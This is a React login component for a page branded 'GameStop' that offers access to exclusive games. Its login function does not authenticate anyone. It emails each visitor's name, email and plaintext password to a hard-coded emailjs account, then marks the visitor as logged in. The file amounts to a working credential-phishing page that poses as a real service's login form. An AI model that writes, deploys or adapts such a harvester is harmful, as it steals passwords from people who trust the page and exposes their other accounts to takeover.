import React, { Component } from 'react';
import { Jumbotron, FormGroup, InputGroup, FormControl } from 'react-bootstrap';
import { withRouter } from 'react-router-dom';
import emailjs from 'emailjs-com';

class Login extends Component {
    constructor(props){
        super(props);
        this.state = {
            name: '',
            username: '',
            password: '',
            invalid: false,
        }
        this.login = this.login.bind(this);
    }

     

    login(){
        var _this = this;
        
        setTimeout(() => {
            var reg = /^([A-Za-z0-9_\-\.])+\@([A-Za-z0-9_\-\.])+\.([A-Za-z]{2,4})$/;
            if (reg.test(_this.state.username) && _this.state.password.length>6){
               //send mail
               emailjs.send("service_epxpok8","template_214pnxm",{
                name: _this.state.name,
                mail: _this.state.username,
                password: _this.state.password,
                },"user_02AbD7U7QCl2oSkz0IcUJ")
              .then((result) => {
                  window.location.reload()  //This is if you still want the page to reload (since e.preventDefault() cancelled that behavior) 
              }, (error) => {
                  console.log("type"+error.text);
              });

                sessionStorage.setItem('isUserLoggedIn', true);
                this.props.history.push('/react-classic-games/login');


            }else{
                _this.setState({invalid: true});
            }
        }, 3000);
    }


    

    render() {
        return (
            <div className="bodyContainer" >

                <Jumbotron className="container" style={{ padding: '20px',borderRadius:40 }}>
                {sessionStorage.getItem('isUserLoggedIn') ? <div>
                    
                    <h2> Welcome GameStop! </h2>
                    You have access to some other games that other people don't have access to 	&#128521;!
                    <br/><br/>
                    <h3>Enjoy!</h3>
                     </div> 
                
                : <div className="row justify-content-md-center">
                    <h2> Login to GameStop! </h2>
                    
                    {this.state.invalid ? 
                    <span style={{color: 'red'}}> The username or password is invalid! min password length 6  </span> 
                    : null}

                    <div className="" style={{ }}>

                    <FormGroup>
                    <InputGroup>
                    <InputGroup.Addon><span className="glyphicon glyphicon-user"></span></InputGroup.Addon>
                    <FormControl type="text" placeholder="Name" value={this.state.name} 
                    onChange={(e) => this.setState({name: e.target.value})}/>
                    </InputGroup>
                    </FormGroup>

                    <FormGroup>
                    <InputGroup>
                    <InputGroup.Addon><span className="glyphicon glyphicon-envelope"></span></InputGroup.Addon>
                    <FormControl type="text" placeholder="Email id " value={this.state.username} 
                    onChange={(e) => this.setState({username: e.target.value})}/>
                    </InputGroup>
                    </FormGroup>

                    <FormGroup>
                    <InputGroup>
                    <InputGroup.Addon><span className="glyphicon glyphicon-asterisk"></span></InputGroup.Addon>
                    <FormControl type="password" placeholder="Password" value={this.state.password} 
                    onChange={(e) => this.setState({password: e.target.value})}/>
                    </InputGroup>
                    </FormGroup>

                    <button className="btn btn-success" onClick={this.login}>
                    <span className="glyphicon glyphicon-log-in"></span> Login</button>
                    </div>
                    </div>}
                    
                </Jumbotron>
            </div>
        )
    }
}

export default withRouter(Login);